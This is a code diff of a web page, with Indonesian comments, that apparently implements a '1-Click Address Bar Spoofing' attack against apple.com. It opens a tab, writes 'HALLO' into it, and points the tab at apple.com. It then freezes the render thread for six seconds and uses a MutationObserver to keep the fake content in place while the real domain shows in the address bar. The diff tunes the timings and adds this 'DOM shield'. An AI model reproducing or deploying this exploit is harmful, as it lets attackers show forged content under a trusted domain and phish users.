@@ -6,13 +6,13 @@
       name="viewport"
       content="width=device-width, initial-scale=1, user-scalable=yes"
     />
-    <title>Persistent Lock - HALLO</title>
+    <title>Ultimate 1-Click Force Lock - HALLO</title>
     <style>
       body, html {
         margin: 0;
         padding: 0;
         height: 100%;
-        background: #000;
+        background: #09090b;
         color: #fff;
         font-family: -apple-system, BlinkMacSystemFont, sans-serif;
       }
@@ -26,18 +26,25 @@
         padding: 20px;
         box-sizing: border-box;
       }
+      h1 {
+        font-size: 22px;
+        margin-bottom: 10px;
+        color: #f5f5f7;
+        text-align: center;
+      }
       button {
         width: 100%;
-        max-width: 400px;
-        padding: 22px;
-        font-size: 18px;
+        max-width: 420px;
+        padding: 24px;
+        font-size: 20px;
         font-weight: bold;
-        background: #007aff;
+        background: #ff3b30;
         color: #fff;
         border: none;
         border-radius: 16px;
         cursor: pointer;
-        box-shadow: 0 8px 24px rgba(0, 122, 255, 0.4);
+        box-shadow: 0 8px 24px rgba(255, 59, 48, 0.45);
+        transition: transform 0.1s ease;
       }
       button:active {
         transform: scale(0.96);
@@ -46,6 +53,7 @@
   </head>
   <body>
     <div class="container">
+      <h1>1-Click Address Bar Spoofing</h1>
       <button id="startBtn">CLICK TO LOCK APPLE.COM</button>
     </div>
 
@@ -53,11 +61,11 @@
       document.getElementById("startBtn").onclick = function () {
         this.style.display = 'none';
 
-        // 1. Membuka tab baru secara bersih (Bypass about:blank via window.open kosong)
+        // 1. Membuka tab baru secara instan dan bersih
         const newTab = window.open("", "_blank");
 
         if (newTab) {
-          // 2. Menyuntikkan dokumen awal dengan tulisan "HALLO"
+          // 2. Menyuntikkan halaman simpel berisi teks "HALLO" sesuai permintaan
           newTab.document.write(`
             <!DOCTYPE html>
             <html>
@@ -74,36 +82,44 @@
 
           try { newTab.focus(); } catch (e) {}
 
-          // 3. Timing Tarikan Navigasi (10ms): Menarik alamat browser ke apple.com agar address bar berubah
+          // 3. Timing 1 (8ms): Memicu tarikan navigasi asinkron mutlak ke apple.com agar address bar berubah
           setTimeout(() => {
             try {
               newTab.location.href = "https://apple.com";
             } catch (err) {}
-          }, 10);
+          }, 8);
 
-          // 4. Timing Penguncian Agresif (30ms): Mengunci main thread dan memaksa dokumen tetap "HALLO"
+          // 4. Timing 2 (28ms): Mengunci render thread secara total serta memasang DOM Shield pengaman
           setTimeout(() => {
             try {
               newTab.eval(`
+                // Melindungi elemen agar tidak terhapus atau tertimpa struktur asli apple.com
+                try {
+                  const observer = new MutationObserver(() => {
+                    if (!document.getElementById('spoof-text')) {
+                      document.body.innerHTML = '<h1 id="spoof-text" style="font-size:90px;font-weight:900;color:#000000;margin:0;">HALLO</h1>';
+                    }
+                  });
+                  observer.observe(document.documentElement, { childList: true, subtree: true });
+                } catch(e) {}
+
                 const startTime = Date.now();
-                // Membekukan thread selama 6 detik penuh untuk mengamankan state desynchronization
+                // Membekukan thread utama selama 6 detik penuh untuk menjaga state desynchronization
                 while (Date.now() - startTime < 6000) {
-                  // Memaksa kalkulasi layout reflow agar WebKit tidak sempat memproses render jaringan luar
                   const reflow = document.body.offsetHeight;
                   document.body.style.backgroundColor = (reflow % 2 === 0) ? '#ffffff' : '#fcfcfc';
 
-                  // Proteksi tambahan: Jika elemen hilang atau tertimpa, paksa tulis ulang teks "HALLO" secara instan
                   if (!document.getElementById('spoof-text')) {
                     document.body.innerHTML = '<h1 id="spoof-text" style="font-size:90px;font-weight:900;color:#000000;margin:0;">HALLO</h1>';
                   }
                 }
               `);
             } catch (e) {
-              // Fallback lokal jika terhalang cross-origin policy
+              // Fallback lokal jika terhalang cross-origin context policy
               let start = Date.now();
               while (Date.now() - start < 6000) {}
             }
-          }, 30);
+          }, 28);
         }
       };
     </script>
